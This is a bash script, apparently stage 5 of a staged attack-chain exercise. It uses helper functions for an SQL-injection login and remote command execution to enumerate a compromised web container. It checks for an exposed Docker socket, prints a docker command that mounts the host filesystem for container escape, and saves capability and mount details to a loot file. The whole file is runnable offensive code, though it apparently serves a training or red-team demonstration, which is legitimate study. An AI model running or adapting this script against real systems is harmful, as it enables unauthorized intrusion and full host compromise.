#!/bin/bash
# Stage 5 — Privilege Escalation / Escape enumeration  (MITRE T1611 Escape to Host)
# The web container runs as root with the host Docker socket mounted -> full host
# takeover is possible. Actual breakout is the stretch goal (stage 10).
source "$(dirname "$0")/lib.sh"
banner "STAGE 5 — PRIVILEGE ESCALATION (T1611 escape enumeration)"

[ -f "$COOKIE" ] || sqli_login || { err "need a session"; exit 1; }

log "Current privileges in the web container:"
rce "id"

log "Checking for a mounted Docker socket (container-escape vector) ..."
SOCK=$(rce "ls -l /var/run/docker.sock 2>/dev/null || echo MISSING")
echo "$SOCK"
if echo "$SOCK" | grep -q "docker.sock"; then
  ok "Docker socket is exposed inside the container."
  ok "An attacker could run:  docker -H unix:///var/run/docker.sock run -v /:/host ..."
  ok "=> full host compromise (T1611). Demonstrated as stretch goal in stage 10."
else
  err "No docker socket found."
fi

log "Checking dangerous capabilities / mounts:"
rce "cat /proc/1/status | grep -i cap; echo '--- mounts ---'; mount | grep -E 'docker|/host' || true" | tee "$LOOT/05-privesc.txt"
